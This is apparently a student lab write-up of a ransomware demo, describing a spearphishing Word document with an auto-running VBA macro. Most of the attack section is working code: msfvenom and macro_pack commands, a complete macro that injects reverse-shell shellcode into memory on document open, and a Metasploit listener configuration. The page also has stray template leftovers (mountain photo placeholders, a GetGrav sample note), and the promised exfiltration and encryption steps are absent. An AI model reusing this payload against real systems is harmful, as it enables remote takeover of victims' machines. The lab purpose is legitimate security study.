# Ransomware Attack Demo: Basic Spearphishing and Exfiltration
This document describes the setup and execution of a demo showing a simple example of a **Ransomware Attack**.

<br/>

## Attack Description
In the scenario depicted below, the adversary will inject in a carefully constructed **Word document** a **VBA Script** as an obfuscated payload. The adversary will then send this document to the victim through a tailored and customized mail message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
It is assumed that the victim will fall prey of the **Spearphishing Attack** and will download and open the document. Upon the opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)): this allows the adversary to have a **reverse shell** running on the victims platform and remotely controlled by the adversary itself.<br/>
The attacker will then **exfiltrate** victim's files over the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them in order to **compromise** their **integrity** and to demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).

<br/>

## Threat Model
The **Threat Model** necessary for this attack requires the adversary
* knowing the e-mail address of the victim; 
* being able to lure the victim to open the Spearphishing Attachment;
* being able to establish a TCP connection with the victim's machine;
* acquiring enough privileges on the victim's system in order to execute exfiltration and encryption commands.

<br/>

## Setup
To perform the attack described above I used two Virtual Machines (referenced to as VMs in the following)
1. The attacker is associated with a Kali Linux VM, with IPv4 Address `192.168.56.102`;
2. The victim runs a Windows 10 VM, with IPv4 Address `192.168.56.101`.

Both VMs have their network adapter configured as "Attached to NAT" in order to allow intra-communication withing the local network, but also inter-communication on the internet.

<br/>

## Preliminaries
In order to create the Word document containing the malicious VBA Script, I have used `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack). Running the following command on Kali VM
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
```
I am able to obtain a VBA Script that, when executed, will try to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To make it more effective, I have edited it in order to launch a thread to do so:
```vb
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
#EndIf

Private Sub Document_Open()
    On Error Resume Next
    Dim myBytes As Variant
    Dim myThread As Long
    
    #If VBA7 Then
        Dim myAlloc As LongPtr
        Dim result As LongPtr
    #Else
        Dim myAlloc As Long
        Dim result As Long
    #EndIf

    myBytes = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139, _
                    82,24,72,139,82,32,72,15,183,74,74,77,49,201,72,139,114,80,72,49,192,172,60,97,124,2,44, _
                    32,65,193,201,13,65,1,193,226,237,82,72,139,82,32,65,81,139,66,60,72,1,208,102,129,120, _
                    24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,80,68, _
                    139,64,32,73,1,208,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,172,65, _
                    193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
                    208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90, _
                    65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255, _
                    93,73,190,119,115,50,95,51,50,0,0,65,86,73,137,230,72,129,236,160,1,0,0,73,137,229,73, _
                    188,2,0,17,92,192,168,56,102,65,84,73,137,228,76,137,241,65,186,76,119,38,7,255,213,76, _
                    137,234,104,1,1,0,0,89,65,186,41,128,107,0,255,213,106,10,65,94,80,80,77,49,201,77,49, _
                    192,72,255,192,72,137,194,72,255,192,72,137,193,65,186,234,15,223,224,255,213,72,137, _
                    199,106,16,65,88,76,137,226,72,137,249,65,186,153,165,116,97,255,213,133,192,116,10, _
                    73,255,206,117,229,232,147,0,0,0,72,131,236,16,72,137,226,77,49,201,106,4,65,88,72, _
                    137,249,65,186,2,217,200,95,255,213,131,248,0,126,85,72,131,196,32,94,137,246,106,64, _
                    65,89,104,0,16,0,0,65,88,72,137,242,72,49,201,65,186,88,164,83,229,255,213,72,137,195, _
                    73,137,199,77,49,201,73,137,240,72,137,218,72,137,249,65,186,2,217,200,95,255,213,131, _
                    248,0,125,40,88,65,87,89,104,0,64,0,0,65,88,106,0,90,65,186,11,47,15,48,255,213,87,89, _
                    65,186,117,110,77,97,255,213,73,255,206,233,60,255,255,255,72,1,195,72,41,198,72,133,246, _ 
                    117,180,65,255,231,88,106,0,89,73,199,194,240,181,162,86,255,213)

    myAlloc = VirtualAlloc(0, UBound(myBytes), &H1000, &H40)
    
    For i = LBound(myBytes) To UBound(myBytes)
        result = RtlMoveMemory(myAlloc + i, myBytes(i), 1)
    Next i
    
    result = CreateThread(0, 0, myAlloc, 0, 0, myThread)
End Sub

Private Sub AutoOpen()
    Document_Open
End Sub

Private Sub Workbook_Open()
    Document_Open
End Sub
```
To then inject this payload inside a Word document I use `macro_pack`, by running the following command:
```
macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
```
![Photo of Mountain](images/mountain.jpg)
> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features, so I indeed needed to run the `macro_pack` command on an appropriate Windows VM (not previously mentioned for ease of global understanding).

<br/>

## Spearphishing
Once the adversary was able to generate the payload `malicious.docm`, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
Therefore I assumed that the adversary was able to obtain **Valid Credentials** for one **Domain Account** of the `units.it` domain, so it was indeed able to send the required Spearphishing Attachment to the victim.
![Photo of Mountain](images/mountain.jpg)

<br/>

## Exfiltration & Impact
In order to be able to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` payload).<br/>
To do so, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.102
set LPORT 4444
set ExitOnSession false
set EnableStageEncoding true
set StageEncoder x64/xor_dynamic
set AutoRunScript post/windows/manage/migrate NAME=explorer.exe KILL=false
set SessionCommunicationTimeout 300
set EnableUnicodeEncoding true
set HandlerSSLCert /path/to/cert.pem
set StageVerificationCode random
exploit -j
```
Then the listener is launched using the command
```
msfconsole -q -r handler.rc
```

> Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content

[^1]: [Markdown - John Gruber](https://daringfireball.net/projects/markdown/)
